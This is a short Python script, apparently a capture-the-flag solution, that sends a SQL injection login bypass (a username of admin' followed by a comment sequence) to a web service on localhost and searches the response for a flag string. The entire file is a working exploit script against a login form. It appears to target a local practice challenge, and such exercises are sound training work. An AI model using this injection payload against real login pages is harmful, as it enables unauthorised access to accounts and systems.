#!/usr/bin/env python3
import requests

url = 'http://127.0.0.1:13384/'
data = {"username": "admin' -- -", "password": "x"}
r = requests.post(url, data=data)
import re
m = re.search(r'flag\{[^}]+\}', r.text)
if m:
    print('FLAG:', m.group())
